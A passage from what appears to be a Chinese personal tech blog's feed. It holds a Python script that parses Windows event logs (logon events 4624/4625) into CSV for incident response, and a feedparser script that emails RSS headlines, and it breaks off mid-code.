class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重启，就可以看到热点了</p><p>这样的热点可以进行wifi钓鱼，但是配置起来就比较麻烦了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Evtx模块解析Windows日志</title>
      <link href="2019/11/13/%E4%BD%BF%E7%94%A8evtx%E6%A8%A1%E5%9D%97%E8%A7%A3%E6%9E%90windows%E6%97%A5%E5%BF%97/"/>
      <url>2019/11/13/%E4%BD%BF%E7%94%A8evtx%E6%A8%A1%E5%9D%97%E8%A7%A3%E6%9E%90windows%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230164340.png"></p><blockquote><p>平时在做应急响应时需要对Windows日志分析，在进行日志分析时经常遇到Windows日志阅读困难，所以萌生了编写一个解析处理脚本的想法，这里使用了Evtx模块将Windows日志转换成xml，在对通过Windows日志格式对xml进行处理，最终导出csv格式</p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>安装模块<code>pip install python-evtx </code></p><h2 id="windows-日志解释"><a href="#windows-日志解释" class="headerlink" title="windows 日志解释"></a>windows 日志解释</h2><h3 id="事件ID"><a href="#事件ID" class="headerlink" title="事件ID"></a>事件ID</h3><p>EventID 代表Windows的事件ID,而这里的脚本只写了对事件ID为4624和4625的处理。<br>常见有Windows事件ID有</p><table><thead><tr><th align="left">事件ID</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">1102</td><td align="left">清理审计日志</td></tr><tr><td align="left">4624</td><td align="left">账号成功登录</td></tr><tr><td align="left">4625</td><td align="left">账号登录失败</td></tr><tr><td align="left">4768</td><td align="left">Kerberos身份验证（TGT请求）</td></tr><tr><td align="left">4769</td><td align="left">Kerberos服务票证请求</td></tr><tr><td align="left">4776</td><td align="left">NTLM身份验证</td></tr><tr><td align="left">4672</td><td align="left">授予特殊权限</td></tr><tr><td align="left">4720</td><td align="left">创建用户</td></tr><tr><td align="left">4726</td><td align="left">删除用户</td></tr><tr><td align="left">4728</td><td align="left">将成员添加到启用安全的全局组中</td></tr><tr><td align="left">4729</td><td align="left">将成员从安全的全局组中移除</td></tr><tr><td align="left">4732</td><td align="left">将成员添加到启用安全的本地组中</td></tr><tr><td align="left">4733</td><td align="left">将成员从启用安全的本地组中移除</td></tr><tr><td align="left">4756</td><td align="left">将成员添加到启用安全的通用组中</td></tr><tr><td align="left">4757</td><td align="left">将成员从启用安全的通用组中移除</td></tr><tr><td align="left">4719</td><td align="left">系统审计策略修改</td></tr></tbody></table><h3 id="登录类型"><a href="#登录类型" class="headerlink" title="登录类型"></a>登录类型</h3><p>Windows 有10种不同的事件类型，每种类型代表一种</p><table><thead><tr><th align="left">登录类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">交互式登录（用户从控制台登录）</td></tr><tr><td align="left">3</td><td align="left">网络（例如：通过net use,访问共享网络）</td></tr><tr><td align="left">4</td><td align="left">批处理（为批处理程序保留）</td></tr><tr><td align="left">5</td><td align="left">服务启动（服务登录）</td></tr><tr><td align="left">6</td><td align="left">不支持</td></tr><tr><td align="left">7</td><td align="left">解锁（带密码保护的屏幕保护程序的无人值班工作站）</td></tr><tr><td align="left">8</td><td align="left">网络明文（IIS服务器登录验证）</td></tr><tr><td align="left">10</td><td align="left">远程交互（终端服务，远程桌面，远程辅助）</td></tr><tr><td align="left">11</td><td align="left">缓存域证书登录</td></tr></tbody></table><h3 id="功能及后续工作"><a href="#功能及后续工作" class="headerlink" title="功能及后续工作"></a>功能及后续工作</h3><h3 id="目前已有功能"><a href="#目前已有功能" class="headerlink" title="目前已有功能"></a>目前已有功能</h3><ol><li>可以读取evxt文件，并按照格式生成csv</li><li>可以将Windows登录日志过滤出来<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3></li><li>只能在脚本所在目录解析相对路径的日志文件</li><li>目前只对安全日志进行了格式处理<h3 id="后续工作"><a href="#后续工作" class="headerlink" title="后续工作"></a>后续工作</h3></li><li>解析更多的类型</li><li>优化代码<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mmap<span class="token keyword">import</span> contextlib<span class="token keyword">import</span> sys<span class="token keyword">import</span> getopt<span class="token keyword">from</span> Evtx<span class="token punctuation">.</span>Evtx <span class="token keyword">import</span> FileHeader<span class="token keyword">from</span> Evtx<span class="token punctuation">.</span>Views <span class="token keyword">import</span> evtx_file_xml_view<span class="token keyword">from</span> xml<span class="token punctuation">.</span>etree <span class="token keyword">import</span> ElementTreedatalist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token triple-quoted-string string">'''目前采用单线程的方式处理日志，结果导出到csv文件中'''</span><span class="token keyword">def</span> <span class="token function">MyFun</span><span class="token punctuation">(</span>EvtxPath<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>EvtxPath<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">with</span> contextlib<span class="token punctuation">.</span>closing<span class="token punctuation">(</span>mmap<span class="token punctuation">.</span>mmap<span class="token punctuation">(</span>f<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> access<span class="token operator">=</span>mmap<span class="token punctuation">.</span>ACCESS_READ<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> buf<span class="token punctuation">:</span>            fh <span class="token operator">=</span> FileHeader<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> xml<span class="token punctuation">,</span> record <span class="token keyword">in</span> evtx_file_xml_view<span class="token punctuation">(</span>fh<span class="token punctuation">)</span><span class="token punctuation">:</span>                    xml <span class="token operator">=</span> xml<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token triple-quoted-string string">''' xmlns="http://schemas.microsoft.com/win/2004/08/events/event"'''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>                    <span class="token comment"># 此处需要将内容替换掉，不然解析会报错</span>                    InterestEvent<span class="token punctuation">(</span>xml<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">deal_login</span><span class="token punctuation">(</span>status<span class="token punctuation">,</span> Eroot<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 处理单条日志</span>    time <span class="token operator">=</span> Eroot<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'System'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'TimeCreated'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>attrib<span class="token punctuation">[</span><span class="token string">'SystemTime'</span><span class="token punctuation">]</span>  <span class="token comment"># 获取记录日志的时间</span>    time <span class="token operator">=</span> time<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    Datas <span class="token operator">=</span> Eroot<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'EventData'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'Data'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> data <span class="token keyword">in</span> Datas<span class="token punctuation">:</span>        <span class="token keyword">if</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Name'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'IpAddress'</span><span class="token punctuation">:</span>  <span class="token comment"># 获取IP值</span>            <span class="token keyword">if</span> data<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>  <span class="token comment"># 过滤IP值为 - 的记录</span>                <span class="token keyword">return</span>            <span class="token comment"># if data.text == '127.0.0.1': #过了ip为127.0.0.1的IP</span>            <span class="token comment">#     return</span>            ip <span class="token operator">=</span> data<span class="token punctuation">.</span>text        <span class="token keyword">elif</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Name'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'IpPort'</span><span class="token punctuation">:</span>  <span class="token comment"># 获取端口值</span>            port <span class="token operator">=</span> data<span class="token punctuation">.</span>text        <span class="token keyword">elif</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Name'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'LogonProcessName'</span><span class="token punctuation">:</span>  <span class="token comment"># 获取登录进程名</span>            LogonProcessName <span class="token operator">=</span> data<span class="token punctuation">.</span>text        <span class="token keyword">elif</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Name'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'AuthenticationPackageName'</span><span class="token punctuation">:</span>  <span class="token comment"># 加载身份验证包名称</span>            AuthenticationPackageName <span class="token operator">=</span> data<span class="token punctuation">.</span>text        <span class="token keyword">elif</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span>                <span class="token string">'Name'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'LogonType'</span><span class="token punctuation">:</span>  <span class="token comment"># 登录类型，Windows共有10种登录类型</span>            LogonType <span class="token operator">=</span> data<span class="token punctuation">.</span>text            Logoninfo <span class="token operator">=</span> LogonType_info<span class="token punctuation">(</span>LogonType<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 登录信息</span>    datalist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>        <span class="token string">'{},{},{},{},{},{},{}\r\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>status<span class="token punctuation">,</span> time<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> LogonProcessName<span class="token punctuation">,</span> AuthenticationPackageName<span class="token punctuation">,</span>                                          Logoninfo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">LogonType_info</span><span class="token punctuation">(</span>typeid<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Windows登录类型</span>    typeinfo <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'登录类型2：交互式登录（用户从控制台登录）'</span><span class="token punctuation">,</span>        <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">'登录类型3：网络（如访问共享文件夹、访问共享打印机等）'</span><span class="token punctuation">,</span>        <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'登录类型4：批处理（计划任务服务以此种方式运行）'</span><span class="token punctuation">,</span>        <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token string">'登录类型5：服务（服务启动）'</span><span class="token punctuation">,</span>        <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">'登录类型6：不支持'</span><span class="token punctuation">,</span>        <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'登录类型7：解锁（解锁带有密码保护的屏幕保护程序）'</span><span class="token punctuation">,</span>        <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'登录类型8：网络明文（IIS服务器登录验证）'</span><span class="token punctuation">,</span>        <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'登录类型9：新凭证'</span><span class="token punctuation">,</span>        <span class="token string">'10'</span><span class="token punctuation">:</span> <span class="token string">'登录类型10：远程交互（终端服务，远程桌面，远程辅助）'</span><span class="token punctuation">,</span>        <span class="token string">'11'</span><span class="token punctuation">:</span> <span class="token string">'登录类型11：缓存域证书登录'</span><span class="token punctuation">}</span>    <span class="token keyword">return</span> typeinfo<span class="token punctuation">[</span>typeid<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">SaveFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> dataList<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"认证状态,时间,IP,端口,登录进程名,身份验证包名称,认证类型"</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>dataList<span class="token punctuation">)</span><span class="token comment"># 过滤掉不需要的事件，输出感兴趣的事件</span><span class="token keyword">def</span> <span class="token function">InterestEvent</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">:</span>    Eroot <span class="token operator">=</span> ElementTree<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>xml<span class="token punctuation">)</span>    ID <span class="token operator">=</span> Eroot<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'System'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'EventID'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span> ID <span class="token operator">==</span> <span class="token string">'4624'</span><span class="token punctuation">:</span>        deal_login<span class="token punctuation">(</span><span class="token string">'认证成功'</span><span class="token punctuation">,</span> Eroot<span class="token punctuation">)</span>    <span class="token keyword">elif</span> ID <span class="token operator">==</span> <span class="token string">'4625'</span><span class="token punctuation">:</span>        deal_login<span class="token punctuation">(</span><span class="token string">'认证失败'</span><span class="token punctuation">,</span> Eroot<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>    EvtxPath <span class="token operator">=</span> <span class="token string">''</span>    outputfile <span class="token operator">=</span> <span class="token string">'./res.csv'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        opts<span class="token punctuation">,</span> args <span class="token operator">=</span> getopt<span class="token punctuation">.</span>getopt<span class="token punctuation">(</span>argv<span class="token punctuation">,</span> <span class="token string">"hi:o:"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"ifile="</span><span class="token punctuation">,</span> <span class="token string">"ofile="</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> getopt<span class="token punctuation">.</span>GetoptError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test.py -i &lt;EvtxPath&gt; -o &lt;outputfile&gt;'</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> opt<span class="token punctuation">,</span> arg <span class="token keyword">in</span> opts<span class="token punctuation">:</span>        <span class="token keyword">if</span> opt <span class="token operator">==</span> <span class="token string">'-h'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''            test.py -i &lt;EvtxPath&gt; -o &lt;outputfile&gt;            -i 待处理的日志文件路径            -o 以处理结果文件的路径            '''</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"-i"</span><span class="token punctuation">,</span> <span class="token string">"--ifile"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            EvtxPath <span class="token operator">=</span> arg        <span class="token keyword">elif</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"-o"</span><span class="token punctuation">,</span> <span class="token string">"--ofile"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            outputfile <span class="token operator">=</span> arg    <span class="token keyword">if</span> EvtxPath <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"无待处理的日志，请输入待处理的日志文件路径"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'待处理的日志文件：'</span><span class="token punctuation">,</span> EvtxPath<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输出的日志文件：'</span><span class="token punctuation">,</span> outputfile<span class="token punctuation">)</span>    MyFun<span class="token punctuation">(</span>EvtxPath<span class="token punctuation">)</span>    SaveFile<span class="token punctuation">(</span>outputfile<span class="token punctuation">,</span> datalist<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>windows登录类型参考<br><a href="https://www.cnblogs.com/xcsn/p/6375805.html">https://www.cnblogs.com/xcsn/p/6375805.html</a><br><a href="https://www.freebuf.com/vuls/175560.html">https://www.freebuf.com/vuls/175560.html</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python3使用feedparser模块处理rss并发送到指定邮箱</title>
      <link href="2019/11/10/python3%E4%BD%BF%E7%94%A8feedparser%E6%A8%A1%E5%9D%97%E5%A4%84%E7%90%86rss%E5%B9%B6%E5%8F%91%E9%80%81%E5%88%B0%E6%8C%87%E5%AE%9A%E9%82%AE%E7%AE%B1/"/>
      <url>2019/11/10/python3%E4%BD%BF%E7%94%A8feedparser%E6%A8%A1%E5%9D%97%E5%A4%84%E7%90%86rss%E5%B9%B6%E5%8F%91%E9%80%81%E5%88%B0%E6%8C%87%E5%AE%9A%E9%82%AE%E7%AE%B1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>日常工作中，需要大量获取资讯。平时都是直接在网站阅读，当我们要阅读的网站过多时难免会有遗漏。这时我们就可以使用rss进行资讯的订阅，今天我们使用python来解析rss，并通过邮件的形式发送到我们的邮箱中，方便我们阅读。</p></blockquote><hr><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>安装python环境，安装所需要的一些模块requests、feedparser、smtplib、codecs等</p><h2 id="2-收集需要的信息"><a href="#2-收集需要的信息" class="headerlink" title="2.收集需要的信息"></a>2.收集需要的信息</h2><p>RSS(Really Simple Syndication,简易信息聚合)是一种描述和同步网站内容的格式你可以认为是一种定制个性化推送信息的服务。它能够解决你漫无目的的浏览网页的问题。它不会过时，信息越是过剩，它的意义也越加彰显。网络中充斥着大量的信息垃圾，每天摄入了太多自己根本不关心的信息。让自己关注的信息主动来找自己，且这些信息都是用户自己所需要的，这就是RSS的意义。更多RSS详细信息<a href="http://www.rssboard.org/rss-profile">http://www.rssboard.org/rss-profile</a></p><p>feedparser是一个Python的Feed解析库，可以处理RSS ，CDF，Atom 。使用它我们可从任何 RSS 或 Atom 订阅源得到标题、链接和文章的条目了。</p><p>首先用requests爬取你需要的网页信息,再用codecs作编码转换</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36'</span><span class="token punctuation">}</span>page <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>  <span class="token comment"># 获取网页</span>page<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>page_content <span class="token operator">=</span> page<span class="token punctuation">.</span>text  <span class="token comment"># 变为文本格式</span>f <span class="token operator">=</span> codecs<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'new_rss.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># 将刚才的文本写入new_rss.txt文件中去</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>page_content<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>feedparser库的核心就是parse()函数，将获取的网页信息解析为xml格式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">    rss <span class="token operator">=</span> feedparser<span class="token punctuation">.</span>parse<span class="token punctuation">(</span><span class="token string">'new_rss.txt'</span><span class="token punctuation">)</span>  <span class="token comment"># 将文本文件用函数解析成一个字典</span>提取所需要的标题以及链接    msg <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment"># 定义一个变量</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rss<span class="token punctuation">.</span>entries<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tag_a <span class="token operator">=</span> rss<span class="token punctuation">.</span>entries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'link'</span><span class="token punctuation">]</span>  <span class="token comment"># 获取链接</span>        tag_title <span class="token operator">=</span> rss<span class="token punctuation">.</span>entries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token comment"># 获取标题 </span>        tag_content <span class="token operator">=</span> rss<span class="token punctuation">.</span>entries<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token comment">#获取内容</span>        msg <span class="token operator">=</span> msg <span class="token operator">+</span> <span class="token triple-quoted-string string">"""        &lt;p&gt;&lt;a href="%s"&gt;%s&lt;/a&gt;&lt;/p&gt;        """</span> <span class="token operator">%</span> <span class="token punctuation">(</span>tag_a<span class="token punctuation">,</span> tag_title<span class="token punctuation">)</span>     <span class="token comment"># 文本中带入变量的方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-发送邮件"><a href="#3-发送邮件" class="headerlink" title="3.发送邮件"></a>3.发送邮件</h2><p>python发送邮件需要用到python自带的两个模块，smtplib和email。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mail_msg <span class="token operator">=</span> MIMEMultipart<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建一个实例</span>mail_msg<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span> <span class="token operator">=</span> subject <span class="token comment">#邮件主题</span>mail_msg<span class="token punctuation">[</span><span class="token string">'From'</span><span class="token punctuation">]</span> <span class="token operator">=</span> fromaddr  <span class="token comment">#发信人邮箱</span>mail_msg<span class="token punctuation">[</span><span class="token string">'To'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>toaddrs<span class="token punctuation">)</span> <span class="token comment">#收信人邮箱</span>mail_msg<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>MIMEText<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># html格式  文本为plain</span><span class="token keyword">try</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 实例化</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>smtpaddr<span class="token punctuation">)</span>  <span class="token comment"># 连接smtp服务器</span>    s<span class="token punctuation">.</span>login<span class="token punctuation">(</span>fromaddr<span class="token punctuation">,</span> password<span class="token punctuation">)</span>  <span class="token comment"># 登录邮箱</span>    s<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>fromaddr<span class="token punctuation">,</span> toaddrs<span class="token punctuation">,</span> mail_msg<span class="token punctuation">.</span>as_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 发送邮件</span>    s<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Successfully sent email"</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error: unable to send email"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>traceback<span class="token punctuation">.</span>format_exc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 回溯错误问题所在</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-完整代码"><a href="#4-完整代码" class="headerlink" title="4.完整代码"></a>4.完整代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> codecs<span class="token keyword">import</span> feedparser<span class="token keyword">import</span> smtplib<span class="token keyword">import</span> traceback<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text <span class="token keyword">import</span> MIMEText<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>multipart <span class="token keyword">import</span> MIMEMultipart<span class="token keyword">def</span> <span class="token function">sendmail</span><span class="token punctuation">(</span>subject<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> toaddrs<span class="token punctuation">,</span> fromaddr<span class="token punctuation">,</span> smtpaddr<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    @subject:邮件主题    @msg:邮件内容    @toaddrs:收信人的邮箱地址    @fromaddr:发信人的邮箱地址    @smtpaddr:smtp服务地址，可以在邮箱看，比如163邮箱为smtp.163.com    @password:网站授权码    """</span>    mail_msg <span class="token operator">=</span> MIMEMultipart<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建一个实例</span>    mail_msg<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span> <span class="token operator">=</span> subject    mail_msg<span class="token punctuation">[</span><span class="token string">'From'</span><span class="token punctuation">]</span> <span class="token operator">=</span> fromaddr    mail_msg<span class="token punctuation">[</span><span class="token string">'To'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>toaddrs<span class="token punctuation">)</span>    mail_msg<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>MIMEText<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># html格式  文本为plain</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 实例化</span>        s<span class="token punctuation">.</span>connect<span class="token 